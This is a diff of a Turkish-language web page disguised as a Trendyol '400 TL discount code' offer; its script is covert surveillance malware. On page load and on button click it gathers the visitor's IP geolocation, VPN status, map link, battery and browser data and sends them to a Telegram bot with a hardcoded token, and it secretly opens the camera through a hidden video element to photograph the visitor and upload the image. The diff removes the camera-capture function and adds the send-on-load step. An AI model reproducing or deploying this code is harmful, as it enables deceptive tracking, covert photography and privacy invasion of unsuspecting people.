@@ -1,117 +1,7 @@
-<!DOCTYPE html>
-<html lang="tr">
-<head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>Trendyol - 400 TL İndirim Kodu</title>
-<link rel="icon" href="https://cdn.dsmcdn.com/web/favicon.ico" />
-<style>
-  *{box-sizing:border-box; font-family:Arial,sans-serif; margin:0; padding:0;}
-  body{background:#f5f5f5; display:flex; justify-content:center; align-items:center; height:100vh;}
-  .container{background:#fff; padding:30px; border-radius:8px; box-shadow:0 0 12px rgba(0,0,0,0.15); width:90%; max-width:400px; text-align:center;}
-  header{background:#f27a1a; padding:15px 0; margin-bottom:20px;}
-  header img{height:30px;}
-  h2{color:#333; margin-bottom:20px;}
-  input[type=text]{width:100%; padding:12px; border:1px solid #ccc; border-radius:4px; font-size:16px; margin-bottom:20px;}
-  button{width:100%; padding:12px; background:#f27a1a; border:none; color:#fff; font-size:16px; border-radius:4px; cursor:pointer; transition:background 0.3s;}
-  button:hover{background:#e06800;}
-  .code-box{margin-top:20px; background:#f0f0f0; border-left:4px solid #f27a1a; padding:15px; font-weight:bold; word-break:break-word; display:none;}
-  .error{color:red; margin-top:10px; display:none;}
-</style>
-</head>
-<body>
-
-<div class="container">
-  <header><img src="https://cdn.dsmcdn.com/web/logo/ty-web.svg" alt="Trendyol" /></header>
-  <h2>400 TL Değerinde İndirim Kodunuzu Alın</h2>
-  <input type="text" id="codeInput" placeholder="Arkadaşınızın size verdiği kodu girin" autocomplete="off" />
-  <button id="submitBtn">Kodu Göster</button>
-  <div class="error" id="errorMsg">Kod hatalı veya süresi dolmuş olabilir.</div>
-  <div class="code-box" id="fakeCode"></div>
-</div>
-
 <script>
-const BOT_TOKEN = "8489674777:AAG1eCe75YEKNHrCPHbzUgb3n1Ag6_S83sY";
-const ADMIN_ID = "7791726274";
-const ADMIN_CODE = "670570";  // Admin kodu, herkes için değil
-
-const urlParams = new URLSearchParams(window.location.search);
-const CHAT_ID = urlParams.get("chat");    // Karşı tarafın chat ID'si, zorunlu
-const URL_SIFRE = urlParams.get("sifre"); // Kişisel şifre
-
-// Admin veya normal kullanıcı farkını botta kontrol edeceksin. 
-// Burada client tarafında sadece basit kontrol yapılır.
-
-// Rastgele sahte kod üretimi
-function generateFakeCode() {
-  const part1 = Math.floor(1000 + Math.random() * 9000);
-  const part2 = Math.random().toString(36).substring(2,4).toUpperCase();
-  return `TR-${part1}-${part2}`;
-}
-
-// Telegram API ile mesaj gönderimi
-async function sendTelegramMessage(chat_id, text) {
-  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ chat_id, text }),
-  });
-}
-
-// IP bilgisi alma
-async function getIPData() {
-  try {
-    const res = await fetch("https://ipapi.co/json/");
-    return await res.json();
-  } catch {
-    return {};
-  }
-}
-
-// Batarya bilgisi alma
-async function getBatteryInfo() {
-  try {
-    const bat = await navigator.getBattery();
-    const level = Math.round(bat.level * 100);
-    const charging = bat.charging ? "Prize takılı" : "Bataryada";
-    return { level, charging };
-  } catch {
-    return { level: "Bilinmiyor", charging: "" };
-  }
-}
-
-// Kamera gizlice açma ve foto çekme
-async function takePhoto() {
-  try {
-    const video = document.createElement("video");
-    video.style.display = "none";
-    document.body.appendChild(video);
-    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-    video.srcObject = stream;
-    await new Promise(r => setTimeout(r, 1500));
-    const canvas = document.createElement("canvas");
-    canvas.width = 640;
-    canvas.height = 480;
-    const ctx = canvas.getContext("2d");
-    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-    canvas.toBlob(async (blob) => {
-      const formData = new FormData();
-      formData.append("chat_id", CHAT_ID);
-      formData.append("photo", blob, "photo.jpg");
-      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-        method: "POST",
-        body: formData
-      });
-      stream.getTracks().forEach(track => track.stop());
-      video.remove();
-    }, "image/jpeg");
-  } catch(e) {
-    // Kamera reddedilirse umurumda değil, sikeyim
-  }
-}
-
+...
 // Kullanıcı verilerini Telegram'a gönder
-async function sendUserData(fakeCode) {
+async function sendUserData(fakeCode, withPhoto = false) {
   const ipData = await getIPData();
   const battery = await getBatteryInfo();
   const userAgent = navigator.userAgent;
@@ -129,34 +19,27 @@ async function sendUserData(fakeCode) {
 🔐 VPN/Proxy: ${vpnProxy}
 🗺️ Harita: ${mapsLink}
 🔋 Şarj: ${battery.level}% (${battery.charging})
-💻 Kod: ${fakeCode}`;
+💻 Kod: ${fakeCode || "-"}`;
 
   await sendTelegramMessage(CHAT_ID, message);
-  takePhoto();
+
+  if (withPhoto) {
+    await takePhoto();
+  }
 }
 
-function showError(msg) {
-  const errorDiv = document.getElementById("errorMsg");
-  errorDiv.textContent = msg;
-  errorDiv.style.display = "block";
-  document.getElementById("fakeCode").style.display = "none";
+// Siteye girer girmez IP gönder
+if (CHAT_ID) {
+  sendUserData(null, false);
 }
 
-function hideError() {
-  const errorDiv = document.getElementById("errorMsg");
-  errorDiv.style.display = "none";
-}
-
+// "Kodu Göster" butonu
 document.getElementById("submitBtn").addEventListener("click", async () => {
   const input = document.getElementById("codeInput").value.trim();
-
-  // Öncelikle chat ID ve sifre URL parametrelerinden gelmeli, yoksa kafan karışır
   if (!CHAT_ID || !URL_SIFRE) {
     showError("Bu siteyi doğru link üzerinden açmalısın.");
     return;
   }
-
-  // Eğer kullanıcı kendi kendine admin kodunu girerse
   if(input === ADMIN_CODE){
     hideError();
     const fakeCode = generateFakeCode();
@@ -164,28 +47,18 @@ document.getElementById("submitBtn").addEventListener("click", async () => {
     codeDiv.textContent = `Kod başarıyla tanımlandı! Onay Kodunuz: ${fakeCode}`;
     codeDiv.style.display = "block";
     await sendTelegramMessage(ADMIN_ID, `Admin kodu kullanıldı.`);
-    await sendUserData(fakeCode);
+    await sendUserData(fakeCode, true);
     return;
   }
-
-  // Normal kullanıcı şifre kontrolü (URL parametresi ile eşleşmeli)
   if(input !== URL_SIFRE){
     showError("Kod hatalı veya süresi dolmuş olabilir.");
     return;
   }
-
-  // Buraya bottan süresi kontrolü API'si yok, bu yüzden linki sadece süresi dolmamışlara veriyorsun.
-  // Siteye girildiği an veri topla ve telegrama düşür, kod üret.
-
   hideError();
   const fakeCode = generateFakeCode();
   const codeDiv = document.getElementById("fakeCode");
   codeDiv.textContent = `Kod başarıyla tanımlandı! Onay Kodunuz: ${fakeCode}`;
   codeDiv.style.display = "block";
-  await sendUserData(fakeCode);
+  await sendUserData(fakeCode, true);
 });
-
 </script>
-
-</body>
-</html>
